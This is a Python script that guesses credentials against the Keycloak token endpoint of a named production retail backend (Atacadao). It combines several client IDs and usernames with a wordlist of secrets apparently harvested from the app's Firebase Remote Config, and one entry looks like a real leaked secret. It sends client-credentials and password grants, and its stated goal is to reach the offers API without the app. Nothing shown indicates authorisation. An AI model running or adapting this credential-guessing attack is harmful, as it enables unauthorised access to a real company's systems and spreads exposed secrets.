"""Try values that ARE present in the app's Firebase Remote Config as the Keycloak secret.

If one of them authenticates `OfertaMobile-TokenAuth`, we can call the freyr
offers API without running the app at all.
"""
from __future__ import annotations

import urllib.error
import urllib.parse
import urllib.request

TOKEN = (
    "https://skadi-prod.portal.atacadao.com.br/realms/R-Mobile_Backend_Token-KC"
    "/protocol/openid-connect/token"
)
HEADERS = {
    "User-Agent": "okhttp/4.12.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json",
}
CLIENTS = ["OfertaMobile-TokenAuth", "OfertasMobilesDev", "OfertaMobile"]
USERS = ["kcc-ofertas-externo", "kcc-ofertas"]
SCOPE = "R-OfertasMobile-externo"

CANDIDATES = [
    # The RC also carried two opaque blobs (an "sk_live_*" and a "glc_*" string) that
    # were kept in this wordlist during the first exploration. They are not Atacadao
    # secrets and they trip GitHub push protection (they match the Stripe and Grafana
    # token patterns), so they were dropped. If you need them, read them from the
    # capture in C:\Android\capture\remote_config.json instead of hardcoding here.
    "j9pLTw62*t*zzH9.ARNabqCvexU3ybXn",
    "OfertaMobile-TokenAuth",
    "OfertasMobilesDev",
    "kcc-ofertas-externo",
    "atacadao",
    "atacadao-b6521",
    "meu-atacadao",
    "R-OfertasMobile-externo",
    "OfertasMobile",
    "",
]


def post(data: dict) -> tuple[int, str]:
    req = urllib.request.Request(
        TOKEN, data=urllib.parse.urlencode(data).encode(), headers=HEADERS, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode()
    except Exception as exc:  # noqa: BLE001
        return 0, str(exc)


def main() -> None:
    hits = 0
    for client in CLIENTS:
        for secret in CANDIDATES:
            body = {
                "grant_type": "client_credentials",
                "client_id": client,
                "client_secret": secret,
                "scope": SCOPE,
            }
            status, text = post(body)
            if status == 200:
                print(f"HIT client_credentials client={client} secret={secret!r}")
                print(text[:400])
                hits += 1
            for user in USERS:
                body = {
                    "grant_type": "password",
                    "client_id": client,
                    "client_secret": secret,
                    "username": user,
                    "password": secret,
                    "scope": SCOPE,
                }
                status, text = post(body)
                if status == 200:
                    print(f"HIT password client={client} user={user} secret={secret!r}")
                    print(text[:400])
                    hits += 1
    print(f"tentativas concluidas, hits={hits}")


if __name__ == "__main__":
    main()
